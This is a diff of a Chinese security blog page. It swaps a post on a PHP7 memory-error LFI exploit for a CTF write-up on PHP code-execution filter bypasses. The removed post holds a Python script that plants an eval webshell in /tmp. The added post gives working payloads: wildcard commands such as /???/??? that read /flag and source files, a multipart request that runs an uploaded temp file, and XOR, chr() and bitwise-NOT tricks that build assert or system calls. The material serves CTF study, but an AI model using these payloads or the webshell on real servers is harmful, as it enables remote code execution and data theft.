@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php7内存错误LFI, Keep-Boom">
+    <meta name="keywords" content="ctf代码执行, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php7内存错误LFI | Keep-Boom</title>
+    <title>ctf代码执行 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php7内存错误LFI</h1>
+                    <h1 class="description center-align post-title">ctf代码执行</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-07
+                    2021-07-10
                 </div>
                 
 
@@ -459,42 +459,139 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>原理</strong></p>
-<p>原理利用payload使服务器发生内存错误，此时同时上传一个文件(经过30秒左右才会被删除)</p>
-<p>临时文件生成在upload_tmp_dir指定路径下</p>
-<p>包含临时文件使之生成一个新的木马文件放在tmp目录下</p>
-<p><strong>exp</strong></p>
-<pre><code># -*- coding: utf-8 -*-
+                <h4 id="Linux读取文件内容命令"><a href="#Linux读取文件内容命令" class="headerlink" title="Linux读取文件内容命令"></a>Linux读取文件内容命令</h4><pre><code>cat：从第一行开始显示文本内容（适用于内容较少的）
+tac：从最后一行开始显示，是 cat 的逆顺序
+more：一页一页的显示文本内容（适用于内容较多的）
+less：与 more 类似，但是比 more 更好的是，它可以往前翻页！
+head：只看文本的前面几行
+tail：只看文本的后面几行
+nl：显示文本内容与行号
+php</code></pre>
+<h4 id="极限利用-非字符数字命令执行"><a href="#极限利用-非字符数字命令执行" class="headerlink" title="极限利用-非字符数字命令执行"></a>极限利用-非字符数字命令执行</h4><p>source</p>
+<pre><code>&lt;?php
+include &#39;flag.php&#39;;
+if(isset($_GET[&#39;code&#39;]))&#123;
+    $code = $_GET[&#39;code&#39;];
+    if(strlen($code)&gt;40)&#123;
+        die(&quot;Long.&quot;);
+    &#125;
+    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;
+        die(&quot;NO.&quot;);
+    &#125;
+    @eval($code);
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+//$hint =  &quot;php function getFlag() to get flag&quot;;
+?&gt;</code></pre>
+<p>首先根据提示，说的是要执行<code>getFlag</code>函数，来拿flag，然后开始构造。</p>
+<h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p>其中有三种方式：</p>
+<ol>
+<li>两个字符串执行异或操作以后，得到的还是一个字符串</li>
+<li>位运算里的“取反”，可以使用中文得到所有字符</li>
+<li>我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符</li>
+</ol>
+<pre><code>function u($x)&#123;
+    return urldecode($x);
+&#125;
+$_=(u(&#39;%07&#39;)^&#39;`&#39;).(u(&#39;%05&#39;)^&#39;`&#39;).(u(&#39;%14&#39;)^&#39;`&#39;).(u(&#39;%1B&#39;)^&#39;]&#39;).(u(&#39;%0C&#39;)^&#39;`&#39;).(u(&#39;%01&#39;)^&#39;`&#39;).(u(&#39;%07&#39;)^&#39;`&#39;);
+var_dump($_);
+//$_();
+=&gt;string(7) &quot;getFlag&quot;</code></pre>
+<p>但是在这里因为长度的限制都不能绕过。</p>
+<h5 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h5><p>Linux下一切皆是文件，可以尝试构造一个命令进行文件读取。</p>
+<h6 id="怎么取回结果呢？"><a href="#怎么取回结果呢？" class="headerlink" title="怎么取回结果呢？"></a><strong>怎么取回结果呢？</strong></h6><p>要想得到读文件或者命令执行的内容，我们需要一个用来输出的东西，但是我们又没有常规的函数，经过了一段时间的思考，想到了</p>
+<pre><code>&lt;?=123?&gt;</code></pre>
+<p>大家可能在刚开始学开发的时候，做模板渲染，用过这个方法，但是说真的不是很容易想起来，而且关键的是这个方式默认是开着的。</p>
+<h6 id="怎么执行命令？"><a href="#怎么执行命令？" class="headerlink" title="怎么执行命令？"></a>怎么执行命令？</h6><p>既然输出方式有了，那也得有能执行命令或者读文件的地方呀，于是想到了在php题目中经常出现的执行命令的方式</p>
+<pre><code>echo `ls`;</code></pre>
+<h6 id="没有数字字母怎么找到flag呢"><a href="#没有数字字母怎么找到flag呢" class="headerlink" title="没有数字字母怎么找到flag呢?"></a>没有数字字母怎么找到flag呢?</h6><p>在Linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法。</p>
+<pre><code>/???/??? =&gt; /bin/cat</code></pre>
+<h6 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h6><pre><code>?code=?&gt;&lt;?=`/???/???%20/???/???/????/?????.???`?&gt;  =&gt;  ?code=?&gt;&lt;?=`/bin/cat /var/www/html/index.php`?&gt;
+但是发现长度超出范围,利用*来匹配文件夹下的所有文件
+?code=?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;
+或者利用.直接指向当前目录
+?code=?&gt;&lt;?=`/???/???%20./*`?&gt;</code></pre>
+<p>右击查看源码，发现getFlag()</p>
+<pre><code>&lt;?php
+$FLAG = file_get_contents(&quot;/flag&quot;);</code></pre>
+<p>读取/flag</p>
+<pre><code>?code=?&gt;&lt;?=`/???/???%20/????`?&gt;</code></pre>
+<h5 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h5><ol>
+<li><p>shell下可以利用<code>.</code>来执行任意脚本</p>
+</li>
+<li><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
+<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
+</li>
+<li><p>利用  . /???/?????????  会报错因为能够匹配上<code>/???/?????????</code>这个通配符的文件有很多例如：/etc/run-parts等但是@-[]可以指定该位是大写字母就可以避免了。</p>
+</li>
+<li><p>可能不是每次临时文件名最后一位都是大写字母，但多发几次就行。(前提要知道upload_tmp_dir=/tmp)</p>
+</li>
+</ol>
+<pre><code>?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code></pre>
+<h6 id="请求包"><a href="#请求包" class="headerlink" title="请求包"></a>请求包</h6><pre><code>POST /index.php?code=?&gt;&lt;?=`.+/???/????????[@-[]`;?&gt; HTTP/1.1
+Host: 172.31.65.101
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://172.31.65.103/index.php
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
+Content-Length: 237
 
-import requests
-import string
-import itertools
-import base64
+-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;fox.php&quot;
+Content-Type: application/octet-stream
 
-host = &quot;192.168.1.100&quot;
-port = 80
-base_url = &quot;http://%s:%d&quot; % (host, port)
+#!/bin/sh
 
+id
+-----------------------------10242300956292313528205888</code></pre>
+<h4 id="get-defined-functions绕过"><a href="#get-defined-functions绕过" class="headerlink" title="get_defined_functions绕过"></a>get_defined_functions绕过</h4><p>source</p>
+<pre><code>&lt;?php
+$cmd = $_GET[&#39;cmd&#39;];
+function check()&#123;
+    global $cmd;
+    foreach (get_defined_functions()[&#39;internal&#39;] as $blacklisted) &#123;
+        if (preg_match (&#39;/&#39; . $blacklisted . &#39;/im&#39;, $cmd)) &#123;
+            echo &quot;Your cmd is in blacklist&quot; . &quot;&lt;br&gt;&quot;;
+            return true;
+            break;
+        &#125;
+    &#125;
+    return false;
+&#125;
 
-def upload_file_to_include(url, file_content):
-    files = &#123;&#39;file&#39;: (&#39;0xEaS.jpg&#39;, file_content, &#39;image/jpeg&#39;)&#125;
-    try:
-        response = requests.post(url, files=files)
+if(check())&#123;
+    echo &quot;Stop hack!!!&quot; . &quot;&lt;br&gt;&quot;;
+    &#125;else&#123;
+        eval($cmd);
+    &#125;
+?&gt;</code></pre>
+<p>get_defined_functions打印出所有定义过的函数，包括内置(internal) 和用户定义的函数。 可通过$arr[“internal”]来访问系统内置函数， 通过$arr[“user”]来访问用户自定义函数。</p>
+<h5 id="①因为eval不在内置函数中，所以可以利用eval"><a href="#①因为eval不在内置函数中，所以可以利用eval" class="headerlink" title="①因为eval不在内置函数中，所以可以利用eval"></a>①因为eval不在内置函数中，所以可以利用eval</h5><pre><code>?cmd=eval($_GET[1]);&amp;1=phpinfo();</code></pre>
+<h5 id="②利用echo输出，反引号-执行命令"><a href="#②利用echo输出，反引号-执行命令" class="headerlink" title="②利用echo输出，反引号`执行命令"></a>②利用echo输出，反引号`执行命令</h5><pre><code>?cmd=echo `ls /`;</code></pre>
+<h5 id="③利用动态变量"><a href="#③利用动态变量" class="headerlink" title="③利用动态变量"></a>③利用动态变量</h5><pre><code>?cmd=$a=&quot;sys&quot;;$b=&quot;tem&quot;;$c=$a.$b;$d=&quot;ls /&quot;;$c($d);</code></pre>
+<h5 id="④利用位运算里的“异或”"><a href="#④利用位运算里的“异或”" class="headerlink" title="④利用位运算里的“异或”"></a>④利用位运算里的“异或”</h5><pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);  // $_=&#39;assert&#39;;
+$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);  // $__=&#39;_POST&#39;;
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);</code></pre>
+<pre><code>?cmd=$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);
 
-    except Exception as error:
-        pass
+POST:_=phpinfo()</code></pre>
+<h5 id="⑤拼接"><a href="#⑤拼接" class="headerlink" title="⑤拼接"></a>⑤拼接</h5><h6 id="法一-a"><a href="#法一-a" class="headerlink" title="法一($a)()"></a><strong>法一($a)()</strong></h6><p>PHP7前是不允许用($a)();</p>
+<pre><code>?cmd=(s.yst.e.m)(&quot;ls /&quot;);</code></pre>
+<h6 id="法二-chr"><a href="#法二-chr" class="headerlink" title="法二:chr()"></a><strong>法二:chr()</strong></h6><pre><code>?cmd=$c=ch.r;$u=$c(95);$m=$c(47);$p=p.r.i.n.t.$u.r;$f=f.i.l.e.$u.g.e.t.$u.c.o.n.t.e.n.t.s;$t=$m.f.l.a.g
+;$p($f($t));
+//print_r(file_get_content(/flag))
 
-def generate_tmp_files():
-    webshell_content = base64.b64encode(&#39;&lt;?php eval($_REQUEST[&quot;0xEaS&quot;]);?&gt;&#39;.encode()).decode().strip()
-    file_content = &#39;&lt;?php if(file_put_contents(&quot;/tmp/0xEaS&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;Getshell success!&quot;;&#125;?&gt;&#39; % (webshell_content)
-    phpinfo_url = &quot;%s/?file=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (base_url) #file=index.php包含自身引发错误
-
-    for i in range(100):
-        print(&quot;[+] %d&quot; % i)
-        upload_file_to_include(phpinfo_url, file_content)
-
-if __name__ == &quot;__main__&quot;:
-    generate_tmp_files()</code></pre>
+?cmd=$f=sy.stem;$a=ch.r;$f(ls.$a(32).$a(47));  //chr(42) =&gt;*
+//system(ls /);</code></pre>
+<h5 id="⑥取反"><a href="#⑥取反" class="headerlink" title="⑥取反"></a>⑥取反</h5><p>PHP&gt;7.0</p>
+<pre><code>urlencode(~(&quot;phpinfo&quot;)) =&gt; %8F%97%8F%96%91%99%90
+?cmd=(~%8F%97%8F%96%91%99%90)();</code></pre>
 
             </div>
             <hr/>
@@ -520,7 +617,7 @@ if __name__ == &quot;__main__&quot;:
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/">http://example.com/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/</a>
+                    <a href="http://example.com/2021/07/10/ctf%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">http://example.com/2021/07/10/ctf%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -725,9 +822,10 @@ if __name__ == &quot;__main__&quot;:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/07/10/ctf%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
                     <div class="card-image">
@@ -745,9 +843,9 @@ if __name__ == &quot;__main__&quot;:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -756,6 +854,7 @@ if __name__ == &quot;__main__&quot;:
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -766,13 +865,13 @@ if __name__ == &quot;__main__&quot;:
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/05/27/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                <a href="/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="cve-2018-12613-PhpMyadmin后台文件包含">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="php7内存错误LFI">
                         
-                        <span class="card-title">cve-2018-12613-PhpMyadmin后台文件包含</span>
+                        <span class="card-title">php7内存错误LFI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -783,7 +882,7 @@ if __name__ == &quot;__main__&quot;:
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-07
                             </span>
                         <span class="publish-author">
                             
